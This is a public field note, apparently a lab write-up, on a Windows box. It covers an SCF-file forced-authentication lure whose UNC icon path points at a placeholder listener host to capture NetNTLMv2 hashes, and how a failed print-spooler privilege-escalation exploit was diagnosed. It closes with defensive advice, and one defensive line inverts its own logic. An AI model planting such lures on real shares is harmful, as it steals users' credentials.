---
title: "Field note: when the right exploit's check passes but its trigger silently no-ops"
category: "fieldnote"
tags:
  - fieldnote
  - windows
  - print-spooler
  - privesc
  - forced-authentication
  - exploit-diagnosis
visibility: "public"
date: "2026-07-02"
---

# When the right exploit's check passes but its trigger silently no-ops

> **VISIBILITY: PUBLIC.** Sanitized; safe to post anywhere.

Two portable lessons from a printer-themed Windows box: one about a forced-authentication foothold, one about diagnosing an exploit that is "correct" and still fails.

## Foothold: a review workflow over a file share is a forced-auth surface

A web app let an authenticated user upload a file that got written to an internal file share, where another user's team browsed it manually to "review" it. That manual review is the vulnerability.

Drop a Windows shell control file (an SCF) whose icon resource is set to a UNC path pointing at your listener:

```text
[Shell]
Command=2
IconFile=\\YOUR_HOST\share\anything.ico
[Taskbar]
Command=ToggleDesktop
```

When the reviewer's Explorer *renders the folder* (no click required), it tries to fetch that icon over SMB and authenticates as the reviewing user. A capture tool on your host catches the NetNTLMv2 challenge-response, which cracks offline if the password is weak.

Recognition conditions that make this port:

- Any "upload here, our team will look at it" flow backed by SMB is a forced-auth primitive, independent of what file type the feature claims to want. You are not uploading the expected content; you are uploading something that makes a viewer's client reach out to you.
- It only yields a *usable* credential when **SMB signing is not required**. If signing is enforced, the forced auth cannot be relayed and the leak loses most of its value.
- The UNC target does not need to exist. The victim authenticates the moment it tries to resolve the path.

Defensive control: require SMB signing everywhere, and never stage attacker-controlled files where a reviewer's file browser auto-renders them.

## Privesc diagnosis: match the technique to the host's actual capabilities

The privilege escalation was a classic "privileged service loads code from a user-writable path": a print spooler running as SYSTEM loads driver DLLs, and the installed vendor driver shipped a world-writable driver directory. The well-known automated exploit module for exactly this driver was the obvious pick. Its capability check passed:

```text
[+] The target appears to be vulnerable. driver directory has full permissions
[*] Adding printer <random>...
[*] Deleting printer <random>
[*] Exploit completed, but no session was created.
```

It never produced a shell. The trap: the module's *check* (is the directory writable?) and its *trigger* (create a printer so the spooler loads the DLL) rely on different host capabilities, and only the check's capability was present. The trigger created its throwaway printer through a management interface (WMI-backed) that the low-privilege user had been explicitly denied. So the file got written, but the SYSTEM-side load was never invoked, and the module swallowed the underlying access-denied error, printing an optimistic "Adding printer" either way.

How the diagnosis actually resolved:

- **Test the write and the trigger separately.** The planted DLL matched the source by hash in the driver directory (write primitive: confirmed). Loaded directly, the payload DLL called back fine (payload: valid). That isolates the failure to the privileged trigger.
- **Run the trigger's underlying primitive by hand.** Invoking the printer-management command directly returned a hard access-denied from the management layer, the same denial seen during enumeration when that same interface refused to list printers. That is the root cause, not "the exploit is flaky" and not "timing."
- **Confirm the side effect independently.** The throwaway printers the module claimed to add never appeared in the system's printer registry. A tool's success message is not proof the side effect happened.
- **Switch to a technique that does not need the revoked capability.** A different exploit for the *same* spooler bug class drove the driver-install path through a lower-level API rather than the management interface, so the access-denied on that interface was irrelevant. It worked on the first try and minted a new privileged account.

The portable rule: **two exploits for the same vulnerability class are not interchangeable if they depend on different host capabilities.** When an exploit's check passes but its action silently produces nothing, decompose it: prove the write, prove the payload, prove the trigger, and test the trigger's own sub-primitive in isolation. The failure is usually a specific denied capability, and a sibling technique that avoids that capability often lands immediately.

Two operator snags worth internalizing on the winning path:

- A blocked script *load* on a locked-down host is an execution-policy problem you can fix for the current process only, without touching machine policy.
- An authorization-style error on a remote-management login is frequently just a wrong password, not a group/permissions problem. Rule out the credential before you go hunting for a missing privilege.

## Defensive summary

- Require SMB signing; treat any share-backed "review" workflow as a forced-auth surface.
- Enforce strong passwords, or the captured hash is worthless.
- On the spooler side: disable the print spooler on hosts that do not print, restrict driver installation by non-admins, and fix world-writable vendor driver-directory ACLs. The privileged-service-loads-user-writable-code pattern is the thing to hunt for, not any single CVE.
